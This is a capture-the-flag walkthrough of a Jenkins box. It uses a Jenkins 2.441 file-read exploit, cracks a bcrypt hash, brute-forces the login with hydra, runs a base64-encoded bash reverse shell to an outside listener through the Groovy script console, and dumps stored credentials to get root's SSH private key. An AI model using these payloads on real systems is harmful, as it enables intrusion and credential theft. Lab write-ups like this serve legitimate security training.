## Intro


tags: #OSCPpath #linux #WebApp #BruteForce #LFI #jenkins #easy 

-----
# Reconnaissance

```shell
source basher target1 10.129.230.220 [IP]
source basher host1 builder.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-19 12:36 -0400
Nmap scan report for 10.129.230.220
Host is up (0.10s latency).
Not shown: 50604 closed tcp ports (reset), 14929 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 21.90 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,8080 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-19 12:37 -0400
Nmap scan report for builder.htb (10.129.230.220)
Host is up (0.049s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   49.02 ms 10.10.14.1
2   49.36 ms builder.htb (10.129.230.220)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds

```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

## Webapp

`http://builder.htb:8080/`
![](MediaFiles/Pasted%20image%2020260919193734.png)
the version is jenkins 2.441


clicking people, reveals a user `Jennifer`
![](MediaFiles/Pasted%20image%2020260919193918.png)
and clicking it reveals nothing more

lets see the login page
![](MediaFiles/Pasted%20image%2020260919194316.png)
we have a valid username (Jennifer) but no passwords, brefore bruteforcing lets try checking the jenkins version for exploits

---
# Foothold

### Vulnerable version

```shell
└─$ searchsploit jenkins 2.441
------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                               |  Path
------------------------------------------------------------------------------------------------------------- ---------------------------------
Jenkins 2.441 - Local File Inclusion                                                                         | java/webapps/51993.py
------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
run exploit
```shell
└─$ python 51993.py -u http://builder.htb:8080/                                                                                                
Press Ctrl+C to exit
File to download:
> ls
File not found.

File to download:
> /etc/passwd
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
root:x:0:0:root:/root:/bin/bash
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
File to download:
> /home/jenkins/.ssh/authorized_keys
File not found.

File to download:
> /home/jenkins/user.txt
File not found.

File to download:
> /var/jenkins_home/user.txt
c31ba341882bce84ef748c840512914d

```

#### File download
##### Rabbit hole
also leaked more stuff
```shell
File to download:
> /etc/hosts
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      0f52c222a4cc
::1     localhost ip6-localhost ip6-loopback
ff00::0 ip6-mcastprefix
127.0.0.1       localhost
fe00::0 ip6-localnet
File to download:
> /etc/shadow
Could not read file.

File to download:
> /root/.ssh/id_rsa
File not found.

File to download:
> ~/.ssh/id_rsa
File not found.

File to download:
> /var/jenkins_home/secrets/master.key
3e3a8909d274de18b90e8d41789423c041dae2b1132514ac43b9714d62305dfba277b5bcec3a06339d9f111e902b64d063bf2eb322eb641edb846e6c019c95cbc38b849fcc2085d5f220c5b6e5468f97d0397502c6afc5a9a1375d346cd0adf08ebc377f48124b9422e91beb5596cdecd72886d7c7e3816a8c488e0270394347
File to download:
> /var/jenkins_home/secrets
Could not read file.

File to download:
> /var/jenkins_home/credentials.xml
<?xml version='1.1' encoding='UTF-8'?>
</com.cloudbees.plugins.credentials.SystemCredentialsProvider>
    <entry>
          <description></description>
        <specifications/>
        <com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey plugin="ssh-credentials@308.ve4497b_ccd8f4">
  <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash">
          <id>1</id>
          <privateKeySource class="com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey$DirectEntryPrivateKeySource">
  </domainCredentialsMap>
      </java.util.concurrent.CopyOnWriteArrayList>
          <scope>GLOBAL</scope>
    </entry>
        </com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey>
<com.cloudbees.plugins.credentials.SystemCredentialsProvider plugin="credentials@1319.v7eb_51b_3a_c97b_">
      <java.util.concurrent.CopyOnWriteArrayList>
            <privateKey>{AQAAABAAAAowLrfCrZx9baWliwrtCiwCyztaYVoYdkPrn5qEEYDqj5frZLuo4qcqH61hjEUdZtkPiX6buY1J4YKYFziwyFA1wH/X5XHjUb8lUYkf/XSuDhR5tIpVWwkk7l1FTYwQQl/i5MOTww3b1QNzIAIv41KLKDgsq4WUAS5RBt4OZ7v410VZgdVDDciihmdDmqdsiGUOFubePU9a4tQoED2uUHAWbPlduIXaAfDs77evLh98/INI8o/A+rlX6ehT0K40cD3NBEF/4Adl6BOQ/NSWquI5xTmmEBi3NqpWWttJl1q9soOzFV0C4mhQiGIYr8TPDbpdRfsgjGNKTzIpjPPmRr+j5ym5noOP/LVw09+AoEYvzrVKlN7MWYOoUSqD+C9iXGxTgxSLWdIeCALzz9GHuN7a1tYIClFHT1WQpa42EqfqcoB12dkP74EQ8JL4RrxgjgEVeD4stcmtUOFqXU/gezb/oh0Rko9tumajwLpQrLxbAycC6xgOuk/leKf1gkDOEmraO7uiy2QBIihQbMKt5Ls+l+FLlqlcY4lPD+3Qwki5UfNHxQckFVWJQA0zfGvkRpyew2K6OSoLjpnSrwUWCx/hMGtvvoHApudWsGz4esi3kfkJ+I/j4MbLCakYjfDRLVtrHXgzWkZG/Ao+7qFdcQbimVgROrncCwy1dwU5wtUEeyTlFRbjxXtIwrYIx94+0thX8n74WI1HO/3rix6a4FcUROyjRE9m//dGnigKtdFdIjqkGkK0PNCFpcgw9KcafUyLe4lXksAjf/MU4v1yqbhX0Fl4Q3u2IWTKl+xv2FUUmXxOEzAQ2KtXvcyQLA9BXmqC0VWKNpqw1GAfQWKPen8g/zYT7TFA9kpYlAzjsf6Lrk4Cflaa9xR7l4pSgvBJYOeuQ8x2Xfh+AitJ6AMO7K8o36iwQVZ8+p/I7IGPDQHHMZvobRBZ92QGPcq0BDqUpPQqmRMZc3wN63vCMxzABeqqg9QO2J6jqlKUgpuzHD27L9REOfYbsi/uM3ELI7NdO90DmrBNp2y0AmOBxOc9e9OrOoc+Tx2K0JlEPIJSCBBOm0kMr5H4EXQsu9CvTSb/Gd3xmrk+rCFJx3UJ6yzjcmAHBNIolWvSxSi7wZrQl4OWuxagsG10YbxHzjqgoKTaOVSv0mtiiltO/NSOrucozJFUCp7p8v73ywR6tTuR6kmyTGjhKqAKoybMWq4geDOM/6nMTJP1Z9mA+778Wgc7EYpwJQlmKnrk0bfO8rEdhrrJoJ7a4No2FDridFt68HNqAATBnoZrlCzELhvCicvLgNur+ZhjEqDnsIW94bL5hRWANdV4YzBtFxCW29LJ6/LtTSw9LE2to3i1sexiLP8y9FxamoWPWRDxgn9lv9ktcoMhmA72icQAFfWNSpieB8Y7TQOYBhcxpS2M3mRJtzUbe4Wx+MjrJLbZSsf/Z1bxETbd4dh4ub7QWNcVxLZWPvTGix+JClnn/oiMeFHOFazmYLjJG6pTUstU6PJXu3t4Yktg8Z6tk8ev9QVoPNq/XmZY2h5MgCoc/T0D6iRR2X249+9lTU5Ppm8BvnNHAQ31Pzx178G3IO+ziC2DfTcT++SAUS/VR9T3TnBeMQFsv9GKlYjvgKTd6Rx+oX+D2sN1WKWHLp85g6DsufByTC3o/OZGSnjUmDpMAs6wg0Z3bYcxzrTcj9pnR3jcywwPCGkjpS03ZmEDtuU0XUthrs7EZzqCxELqf9aQWbpUswN8nVLPzqAGbBMQQJHPmS4FSjHXvgFHNtWjeg0yRgf7cVaD0aQXDzTZeWm3dcLomYJe2xfrKNLkbA/t3le35+bHOSe/p7PrbvOv/jlxBenvQY+2GGoCHs7SWOoaYjGNd7QXUomZxK6l7vmwGoJi+R/D+ujAB1/5JcrH8fI0mP8Z+ZoJrziMF2bhpR1vcOSiDq0+Bpk7yb8AIikCDOW5XlXqnX7C+I6mNOnyGtuanEhiJSFVqQ3R+MrGbMwRzzQmtfQ5G34m67Gvzl1IQMHyQvwFeFtx4GHRlmlQGBXEGLz6H1Vi5jPuM2AVNMCNCak45l/9PltdJrz+Uq/d+LXcnYfKagEN39ekTPpkQrCV+P0S65y4l1VFE1mX45CR4QvxalZA4qjJqTnZP4s/YD1Ix+XfcJDpKpksvCnN5/ubVJzBKLEHSOoKwiyNHEwdkD9j8Dg9y88G8xrc7jr+ZcZtHSJRlK1o+VaeNOSeQut3iZjmpy0Ko1ZiC8gFsVJg8nWLCat10cp+xTy+fJ1VyIMHxUWrZu+duVApFYpl6ji8A4bUxkroMMgyPdQU8rjJwhMGEP7TcWQ4Uw2s6xoQ7nRGOUuLH4QflOqzC6ref7n33gsz18XASxjBg6eUIw9Z9s5lZyDH1SZO4jI25B+GgZjbe7UYoAX13MnVMstYKOxKnaig2Rnbl9NsGgnVuTDlAgSO2pclPnxj1gCBS+bsxewgm6cNR18/ZT4ZT+YT1+uk5Q3O4tBF6z/M67mRdQqQqWRfgA5x0AEJvAEb2dftvR98ho8cRMVw/0S3T60reiB/OoYrt/IhWOcvIoo4M92eo5CduZnajt4onOCTC13kMqTwdqC36cDxuX5aDD0Ee92ODaaLxTfZ1Id4ukCrscaoOZtCMxncK9uv06kWpYZPMUasVQLEdDW+DixC2EnXT56IELG5xj3/1nqnieMhavTt5yipvfNJfbFMqjHjHBlDY/MCkU89l6p/xk6JMH+9SWaFlTkjwshZDA/oO/E9Pump5GkqMIw3V/7O1fRO/dR/Rq3RdCtmdb3bWQKIxdYSBlXgBLnVC7O90Tf12P0+DMQ1UrT7PcGF22dqAe6VfTH8wFqmDqidhEdKiZYIFfOhe9+u3O0XPZldMzaSLjj8ZZy5hGCPaRS613b7MZ8JjqaFGWZUzurecXUiXiUg0M9/1WyECyRq6FcfZtza+q5t94IPnyPTqmUYTmZ9wZgmhoxUjWm2AenjkkRDzIEhzyXRiX4/vD0QTWfYFryunYPSrGzIp3FhIOcxqmlJQ2SgsgTStzFZz47Yj/ZV61DMdr95eCo+bkfdijnBa5SsGRUdjafeU5hqZM1vTxRLU1G7Rr/yxmmA5mAHGeIXHTWRHYSWn9gonoSBFAAXvj0bZjTeNBAmU8eh6RI6pdapVLeQ0tEiwOu4vB/7mgxJrVfFWbN6w8AMrJBdrFzjENnvcq0qmmNugMAIict6hK48438fb+BX+E3y8YUN+LnbLsoxTRVFH/NFpuaw+iZvUPm0hDfdxD9JIL6FFpaodsmlksTPz366bcOcNONXSxuD0fJ5+WVvReTFdi+agF+sF2jkOhGTjc7pGAg2zl10O84PzXW1TkN2yD9YHgo9xYa8E2k6pYSpVxxYlRogfz9exupYVievBPkQnKo1Qoi15+eunzHKrxm3WQssFMcYCdYHlJtWCbgrKChsFys4oUE7iW0YQ0MsAdcg/hWuBX878aR+/3HsHaB1OTIcTxtaaMR8IMMaKSM=}</privateKey>
          </privateKeySource>
          <username>root</username>
          <usernameSecret>false</usernameSecret>
      </com.cloudbees.plugins.credentials.domains.Domain>
      <com.cloudbees.plugins.credentials.domains.Domain>
File to download:
> /var/jenkins_home/users
Could not read file.

File to download:
> /var/jenkins_home//secrets/hudson.util.Secret
&ï¿½$yï¿½Ñµï¿½/ï¿½(CRï¿½5?ï¿½ï¿½S<ï¿½ï¿½ï¿½
                                           ï¿½ï¿½ï¿½dYï¿½X7ï¿½ï¿½iï¿½}ï¿½~ï¿½xï¿½4Gï¿½ï¿½ï¿½]Ã¥T¿½▒^xï¿½ï¿½-ï¿½ï¿½ï¿ï¿½ï¿½Ó¹kï¿½Wï¿½9
                                                                                                                                     ](ï¿½Wï¿½^Ë¾ï¿½'ï¿½ï¿½uï¿½O1Qï¿½ï¿½ï¿½<'uï¿½zï¿½;#NÝ§ï¿½ ï¿½ï¿½Bï¿½Cï¿½â’šX2YÝ€ï¿½T<ï¿½ï¿½*'8ï¿½f5Yï¿½vï¿½)ï¿½ï¿½ï¿½ï¿½)w9ï¿½ï¿½@ï¿½ï¿½ï¿½wï¿½[ï¿½ï¿½ï¿½=ï¿½ï¿½ï¿½;EDï¿+Vï¿½lï¿½Xzï¿½ï¿½eï¿½     ,ï¿½ï¿½Oï¿½Ï¨ï¿½ï¿½]×šï¿½RDlï¿½Ù‘ï¿½@gï¿½xï¿½ï¿½'ï¿½>eï¿½Ø­ï¿½ï¿½fKï¿½??)ï¿½_6DF \(ï¿½ ï¿½ï¿½wï¿½[%ï¿½ï¿½9ï¿½|4y


```
after a lot of research, i found out that we cant use the extracted info,

the private key is an aes-encrypted blob, which when decrypted yields a pem private key.

currently i have:

|File|Status|Why it's useless as-is|
|---|---|---|
|`master.key`|Suspicious|256 hex chars = 128 bytes when decoded. Standard Jenkins uses **32 bytes**. Yours is non-standard, so any key derived from it will almost certainly be wrong.|
|`hudson.util.Secret`|**Corrupted**|Showed `ï¿½` (U+FFFD) characters. This is a **lossy** transformation — original bytes were destroyed, not just mis-displayed. Unrecoverable.|
|`credentials.xml`|Ciphertext only|Contains `{AQAAABAAAA...}` blobs. These are **AES-encrypted**, not PEM keys. Useless without the key.|

```
master.key
    │
    ▼ SHA-256, first 16 bytes
derived_key
    │
    ▼ AES-decrypts
hudson.util.Secret  ──►  confidentiality_key
                              │
                              ▼ AES-decrypts
                         credentials.xml values
                              │
                              ▼
                         actual PEM private key
```
so from all the above, i only keep that the hosts users we can login on target are the `jenkins` and `root` (since the had /bin/bash on /etc/passwd) and we also leaked the flag grom /var/jenkins_home

then tried leaking other stuff:

users
```shell
> /var/jenkins_home/users/users.xml
<?xml version='1.1' encoding='UTF-8'?>
      <string>jennifer_12108429903186576833</string>
  <idToDirectoryNameMap class="concurrent-hash-map">
    <entry>
      <string>jennifer</string>
  <version>1</version>
</hudson.model.UserIdMapper>
  </idToDirectoryNameMap>
<hudson.model.UserIdMapper>
    </entry>

```
user's config:
```shell
> /var/jenkins_home/users/jennifer_12108429903186576833/config.xml
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">
    <hudson.search.UserSearchProperty>
      <roles>
    <jenkins.security.seed.UserSeedProperty>
      </tokenStore>
    </hudson.search.UserSearchProperty>
      <timeZoneName></timeZoneName>
  <properties>
    <jenkins.security.LastGrantedAuthoritiesProperty>
      <flags/>
    <hudson.model.MyViewsProperty>
</user>
    </jenkins.security.ApiTokenProperty>
      <views>
        <string>authenticated</string>
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">
<user>
          <name>all</name>
  <description></description>
      <emailAddress>jennifer@builder.htb</emailAddress>
      <collapsed/>
    </jenkins.security.seed.UserSeedProperty>
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>
    </hudson.model.MyViewsProperty>
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>
          <filterQueue>false</filterQueue>
    <jenkins.security.ApiTokenProperty>
      <primaryViewName></primaryViewName>
      </views>
    </hudson.model.TimeZoneProperty>
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">
    </hudson.model.PaneStatusProperties>
    </hudson.tasks.Mailer_-UserProperty>
        <tokenList/>
    <jenkins.console.ConsoleUrlProviderUserProperty/>
        </hudson.model.AllView>
      <timestamp>1707318554385</timestamp>
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>
  </properties>
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>
    <hudson.security.HudsonPrivateSecurityRealm_-Details>
      <insensitiveSearch>true</insensitiveSearch>
          <properties class="hudson.model.View$PropertyList"/>
    <hudson.model.TimeZoneProperty>
        <hudson.model.AllView>
    </hudson.security.HudsonPrivateSecurityRealm_-Details>
      <providerId>default</providerId>
      </roles>
    </jenkins.security.LastGrantedAuthoritiesProperty>
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>
    <hudson.model.PaneStatusProperties>
<?xml version='1.1' encoding='UTF-8'?>
  <fullName>jennifer</fullName>
      <seed>6841d11dc1de101d</seed>
  <id>jennifer</id>
  <version>10</version>
      <tokenStore>
          <filterExecutors>false</filterExecutors>
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```
#### hash obtained

```
jennifer
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a
```

## Cracking hash

```shell
echo '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' > jen.hash
hashcat -m 3200 jen.hash /usr/share/wordlists/rockyou.txt
```

```shell
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
                                                          
Session..........: hashcat
Status...........: Cracked

```
damn, that was an easy password, we could have avoided the jenkins LFI stuff and just bruteforce it with hydra instead:
## OR via login bruteforce

```shell
hydra -l jennifer -P /usr/share/wordlists/rockyou.txt \
  $target1 -s 8080 \
  http-post-form "/j_spring_security_check:j_username=^USER^&j_password=^PASS^&from=%2Fview%2Fall%2Fbuilds&Submit=:Invalid username or password"
```

tried ssh but did not work, lets try logging in on jenkins
we are in

## Jenkins login as jennifer

![](MediaFiles/Pasted%20image%2020260919203514.png)

there are several options on manage jenkins
![](MediaFiles/Pasted%20image%2020260919203847.png)but these in particular caught my attention
![](MediaFiles/Pasted%20image%2020260919204127.png)

### Script console rev-shell

lets try script console, found this online by searching `jenkins script console rce`
https://cloud.hacktricks.wiki/en/pentesting-ci-cd/jenkins-security/jenkins-rce-with-groovy-script.html

lets encode our rev shell
```shell
bash -c 'bash -i >& /dev/tcp/10.10.14.247/4444 0>&1'
```

```shell
─$ printf %s "bash -c 'bash -i >& /dev/tcp/10.10.14.247/4444 0>&1'" | base64 -w0                                                              
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDcvNDQ0NCAwPiYxJw==
```
and place it in the script console python script exploit
```shell
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = 'bash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNDcvNDQ0NCAwPiYxJw==}|{base64,-d}|{bash,-i}'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"

```
got shell back!

## Shell as jenkins

```shell
└─$ nc -lvnp 4444                                                                                                                              
listening on [any] 4444 ...
connect to [10.10.14.247] from (UNKNOWN) [10.129.230.220] 44156
bash: cannot set terminal process group (8): Inappropriate ioctl for device
bash: no job control in this shell
jenkins@0f52c222a4cc:/$ id    
id
uid=1000(jenkins) gid=1000(jenkins) groups=1000(jenkins)

```

----
# Privesc

### Filesystem enumeration

```shell
jenkins@0f52c222a4cc:~$ ls
ls
config.xml
copy_reference_file.log
credentials.xml
hudson.model.UpdateCenter.xml
hudson.plugins.git.GitTool.xml
identity.key.enc
jenkins.install.InstallUtil.lastExecVersion
jenkins.install.UpgradeWizard.state
jenkins.telemetry.Correlator.xml
jobs
nodeMonitors.xml
nodes
plugins
queue.xml.bak
secret.key
secret.key.not-so-secret
secrets
updates
user.txt
userContent
users
war
```
display etc hosts
```shell
jenkins@0f52c222a4cc:~$ cat /etc/hosts
cat /etc/hosts
127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
172.17.0.2      0f52c222a4cc
```
#### Rabbit hole
list and search recursively multiple files and directories:
```shell
find . -print | sort | awk -F/ '{indent=""; for(i=2;i<NF;i++) indent=indent"│   "; print indent"├── "$NF}'
```

```shell
├── .
├── hudson.util.Secret
├── jenkins.model.Jenkins.crumbSalt
├── master.key
├── org.jenkinsci.main.modules.instance_identity.InstanceIdentity.KEY
├── org.springframework.security.web.authentication.rememberme.TokenBasedRememberMeServices.mac
```
 got on another rabbit hole here, until i realized that i might be able to do it via script console entirely:
## Leaking root's private key from Jenkins script console 

now that we have script console access, we can just dump stuff from there
![](MediaFiles/Pasted%20image%2020260919205326.png)
```shell
com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
  com.cloudbees.plugins.credentials.Credentials.class,
  Jenkins.instance, null, null
).each { c ->
  println "=== ${c.class.name} id=${c.id} ==="
  try { println c.username } catch(e){}
  try { println c.password } catch(e){}
  try { println c.privateKey } catch(e){}
  println ""
}
```
output
```shell
=== com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey id=1 ===
root
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----


Result: [com.cloudbees.jenkins.plugins.sshcredentials.impl.BasicSSHUserPrivateKey@31]
```

## Shell as root

```shell
└─$ ssh -i id_rsa root@builder.htb                                                                                                             
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-94-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

  System information as of Sat Sep 19 05:53:42 PM UTC 2026

  System load:              0.18115234375
  Usage of /:               66.2% of 5.81GB
  Memory usage:             38%
  Swap usage:               0%
  Processes:                217
  Users logged in:          0
  IPv4 address for docker0: 172.17.0.1
  IPv4 address for eth0:    10.129.230.220
  IPv6 address for eth0:    dead:beef::a0de:adff:fed9:eead


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Feb 12 13:15:44 2024 from 10.10.14.40
root@builder:~# id
uid=0(root) gid=0(root) groups=0(root)
root@builder:~# cat root.txt 
805f4b29c1cdb06023ebddffcaf2ef8b
root@builder:~# 
```
under 2 hours